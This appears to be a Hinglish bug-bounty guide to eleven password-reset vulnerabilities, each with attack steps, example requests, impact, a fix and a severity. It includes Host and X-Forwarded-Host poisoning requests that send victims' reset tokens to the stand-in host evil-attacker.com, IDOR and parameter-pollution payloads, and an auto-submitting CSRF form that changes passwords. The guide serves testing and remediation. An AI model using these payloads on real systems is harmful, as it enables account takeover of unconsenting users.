01. Host Header Injection (Classic Reset Poisoning)

Password reset email me link banane ke liye kai apps request ke Host header ko blindly use karte hain. Host header ko attacker-controlled domain me badal do, to victim ko bheja gaya reset link tumhare server ki taraf point karega.

Steps

  1. "Forgot Password" request Burp me capture karo (victim/apna email daal ke).
  2. Host header ko apne attacker-controlled domain se replace karo.
  3. Request forward karo — victim ko email jaayega jisme reset link tumhare domain ki taraf point karega.
  4. Victim link click karega (phishing jaisa) → uska reset token tumhare server ke access log me capture ho jaayega.
  5. Us leaked token ko real domain pe use karke password reset karo.
POST /forgot-password HTTP/1.1 Host: evil-attacker.com Content-Type: application/x-www-form-urlencoded email=victim@target.com // Victim ko mail jaata hai: "Reset your password: https://evil-attacker.com/reset?token=abc123"
💥 Impact: Token attacker ke server pe leak — full account takeover bina victim ko kuch pata chale.
🛡 Fix: Reset link banane ke liye Host header ka istemal kabhi mat karo — server-side hardcoded/whitelisted domain use karo.
SEVERITY: CRITICAL

02. X-Forwarded-Host Header Poisoning

Agar app Host header ko directly trust nahi karti, lekin reverse-proxy/load-balancer headers jaise X-Forwarded-Host ko priority deti hai — to wahi poisoning trick in headers se bhi possible hai.

Steps

  1. Normal Host header poisoning fail ho to, request me X-Forwarded-Host header add karo.
  2. Iske alawa variants bhi try karo: X-Forwarded-Server, X-HTTP-Host-Override, X-Original-Host.
  3. Reset request bhejo, email me link check karo kaunsa domain use hua.
  4. Agar attacker domain reflect hota hai — poisoning confirmed.
POST /forgot-password HTTP/1.1 Host: target.com X-Forwarded-Host: evil-attacker.com email=victim@target.com // reset link me evil-attacker.com reflect ho sakta hai agar proxy config trust karta hai
💥 Impact: Same as Host header poisoning — token leak via attacker domain.
🛡 Fix: Sabhi forwarded/override headers ko ignore karo link-generation logic me, sirf trusted config value use karo.
SEVERITY: HIGH

03. Reset Token Leakage via Referer Header

Jab reset-password page load hoti hai (token URL me hota hai, e.g. ?token=xyz) aur wo page kisi third-party resource (analytics, image CDN, font) ko load karti hai, to browser Referer header me poora URL — token samet — third-party ko bhej deta hai.

Steps

  1. Reset link open karo apne test account ke liye (token URL me visible).
  2. Burp/DevTools Network tab me dekho page ke saath kaunsi third-party requests jaa rahi hain (Google Analytics, Facebook Pixel, CDN fonts).
  3. Un requests ke Referer header check karo — kya poora URL (token samet) leak ho raha hai.
  4. Agar haan — third-party service provider ke through token intercept ho sakta hai (log access, malicious script, etc).
GET /reset-password?token=8f3a92bc1e HTTP/1.1 // page load hote hi analytics request: GET /collect?... HTTP/1.1 Referer: https://target.com/reset-password?token=8f3a92bc1e // leaked!
💥 Impact: Third-party service ke through token leak, jisse account takeover ho sakta hai.
🛡 Fix: Reset token ko URL query param ki jagah POST body/one-time session me rakho, Referrer-Policy: no-referrer set karo.
SEVERITY: HIGH

04. Predictable / Weak Reset Token

Agar reset token truly random na ho (timestamp-based, sequential, short length, ya weak hash), to multiple tokens generate karke pattern analyze karne se victim ka token predict/brute-force kiya ja sakta hai.

Steps

  1. Apne hi account ke liye baar-baar reset request bhejo, har token note karo timestamp ke saath.
  2. Token length aur character set check karo — chhota token (4-6 chars) brute-forceable hota hai.
  3. Pattern dhoondo: kya token timestamp-derived hai, MD5(email+time) jaisa predictable hash hai, ya sequential hai.
  4. Agar predictable — victim ka token uske reset-request time se calculate/guess karo.
Token #1: a1b2c3 (12:00:01) Token #2: a1b2d4 (12:00:16) Token #3: a1b2e5 (12:00:32) // pattern: prefix fixed, suffix predictable — weak entropy
💥 Impact: Bina brute-force ke bhi kisi bhi user ka reset token predict ho sakta hai — full ATO.
🛡 Fix: CSPRNG se 32+ byte cryptographically random token generate karo, koi predictable input mat use karo.
SEVERITY: CRITICAL

05. Response Manipulation on Reset Verification

Agar reset-token verification client-side response pe depend karti hai (jaise frontend "valid":true dekh ke next-step form dikhata hai), to Burp se response body tamper karke bina sahi token ke bhi new-password step tak pahuncha ja sakta hai.

Steps

  1. Reset page pe koi bhi galat/expired token daal ke submit karo.
  2. Burp Proxy intercept karo response step pe (forward mat karo).
  3. Response body me "valid":false ya "error":true field dhoondo, usko true/success me badlo.
  4. Forward karo — agar app next step (new password set) dikha de, bypass confirmed.
Original: { "tokenValid": false } Modified: { "tokenValid": true } // frontend next step dikha deta hai bina real verification ke
💥 Impact: Bina valid token ke bhi naya password set karne ka form access mil jaata hai.
🛡 Fix: Token validity ka final check hamesha server-side hona chahiye — jab actual password-change request aaye tab bhi.
SEVERITY: HIGH

06. Reset Token Reuse (No Invalidation)

Ek baar use ho chuka reset token agar server "consumed" mark nahi karta, to wahi purana token dobara use karke password fir se reset kiya ja sakta hai — jisse ek leaked purana token bhi hamesha ke liye valid rehta hai.

Steps

  1. Apne account ka reset flow complete karo (password successfully change karo) — token Burp history me save hai.
  2. Kuch der baad wahi purana token le ke phir se reset-password request bhejo Repeater se.
  3. Agar server dobara accept kar leta hai (password change ho jaata hai) — token reuse confirmed.
  4. Bonus: naya reset bhi request karo, dekho purana token abhi bhi kaam karta hai ya nahi (parallel valid tokens).
// same token, dobara use after successful reset POST /api/reset-password {"token":"8f3a92bc1e","newPassword":"NewPass456!"} // already-used token, phir bhi accept
💥 Impact: Purane leaked token se hamesha account takeover possible rehta hai.
🛡 Fix: Token use hote hi database me turant invalidate/delete karo, aur naya reset request purane sabhi tokens ko bhi expire kar de.
SEVERITY: CRITICAL

07. IDOR in Password Reset (Change Any User's Password)

Agar reset-password endpoint request body me user_id/email leta hai aur token ke saath uska match server-side verify nahi karta, to sirf ID/email badal ke doosre user ka password change kiya ja sakta hai.

Steps

  1. Apna khud ka reset flow start karo, final "set new password" request Burp me capture karo.
  2. Request body me user_id / email field dhoondo (token ke alawa).
  3. Apna token rakhte hue, us field ko victim ke email/ID se replace karo.
  4. Send karo — agar server sirf token check karta hai lekin token-to-user binding verify nahi karta, victim ka password change ho jaata hai.
POST /api/reset-password { "token": "my_own_valid_token", "email": "victim@target.com", "newPassword": "Hacked123!" } // server sirf token ki existence check karta hai, email match nahi karta
💥 Impact: Apne hi valid token se kisi bhi target victim ka password change — direct full ATO.
🛡 Fix: Token ko generate hote waqt hi specific user ID se server-side bind karo, request body ke email/ID field ko kabhi trust mat karo.
SEVERITY: HIGH

08. Email Parameter Pollution / Multiple Recipients

Agar reset-request endpoint email field ko array ya multiple values me accept kar leta hai, to attacker apna email + victim ka email dono bhej sakta hai — kuch backend implementations reset link sabko bhej dete hain ya sirf pehle/aakhri wale ko process karte hain inconsistently.

Steps

  1. Forgot-password request capture karo.
  2. Email field ko duplicate karo (query param ya JSON array dono try karo).
  3. Pehla email apna, doosra victim ka (ya vice versa) daalo.
  4. Dekho reset link kis email pe jaata hai, aur kis account ke liye valid hai — mismatch dhoondo.
Query pollution: POST /forgot-password?email=attacker@test.com&email=victim@target.com JSON array: {"email": ["attacker@test.com", "victim@target.com"]} // backend victim ke liye token generate karke attacker ko bhej sakta hai
💥 Impact: Victim ka reset token attacker ke inbox me pahunch sakta hai.
🛡 Fix: Email field ko strictly single string type validate karo, arrays/duplicate params reject karo.
SEVERITY: MEDIUM

09. Reset Link Not Bound to Session/Device

Agar reset link kisi bhi browser/device se, victim ki original session ke bina bhi use ho jaata hai — to token leak hone (screenshot, shared computer, browser history, shared link) ka risk directly account takeover me convert ho jaata hai.

Steps

  1. Reset link generate karo ek browser/device se.
  2. Wahi link poori tarah alag device/browser (incognito, alag machine, VPN se alag location) me open karo.
  3. Agar bina kisi extra verification (email confirm, device check) ke reset ho jaata hai — session binding missing hai.
  4. Check karo ki kya reset ke baad existing sessions bhi invalidate hoti hain ya nahi (should logout everywhere).
💥 Impact: Leaked/shared link kahin se bhi use ho sakta hai, plus reset ke baad purane attacker sessions active reh sakte hain.
🛡 Fix: Reset ke baad saare active sessions invalidate karo, optionally IP/device fingerprint match bhi verify karo.
SEVERITY: MEDIUM

10. CSRF on Password Reset / Change Endpoint

Logged-in state me "change password" (bina old-password verify kiye) ya reset-related settings endpoint agar CSRF token check nahi karta, to attacker apne malicious page se victim ke logged-in session ka use karke unki jaankari ke bina password change करा sakta hai.

Steps

  1. Logged-in state me password-change/email-change request Burp me capture karo.
  2. Dekho request me CSRF token / SameSite cookie protection hai ya nahi.
  3. Agar nahi hai, ek auto-submitting HTML form banao jo yeh exact request replicate kare.
  4. Victim ko wo page visit karao (logged-in state me) — agar password/email badal jaaye, CSRF confirmed.
<form action="https://target.com/api/change-password" method="POST"> <input type="hidden" name="newPassword" value="Hacked123!"> </form> <script>document.forms[0].submit()</script>
💥 Impact: Victim ki jaankari ke bina unka password attacker-controlled value me change ho jaata hai.
🛡 Fix: Har state-changing request pe CSRF token (synchronizer pattern) + SameSite=Strict cookies lagao, sensitive actions me old-password bhi maango.
SEVERITY: HIGH

11. Race Condition on Reset Request

Agar rate-limiting ya "one active token per user" logic sequential check karta hai, to parallel/simultaneous multiple reset requests bhejne se race condition ban sakti hai — jisse multiple valid tokens ek saath exist kar sakte hain ya limit checks bypass ho sakte hain.

Steps

  1. Burp Turbo Intruder (ya ffuf -c) me forgot-password request daalo.
  2. 20-30 identical reset requests ek hi email ke liye simultaneously (single-packet attack) bhejo.
  3. Check karo kya multiple alag-alag valid tokens generate ho gaye (jabki app design "sirf ek active token" hona chahiye tha).
  4. Purane token bhi valid reh gaye ya nahi verify karo — sabhi generated tokens try karo.
// 25 parallel requests, same email, same instant POST /forgot-password {"email":"victim@target.com"} x25 simultaneously // result: 25 alag valid tokens database me ban gaye, sab active
💥 Impact: Rate-limit/token-invalidation logic bypass — attack surface (predictable/leaked tokens) badh jaata hai.
🛡 Fix: Atomic database operations (row-level locking / Redis) use karo token generation ke liye, ek hi active token per user enforce karo.
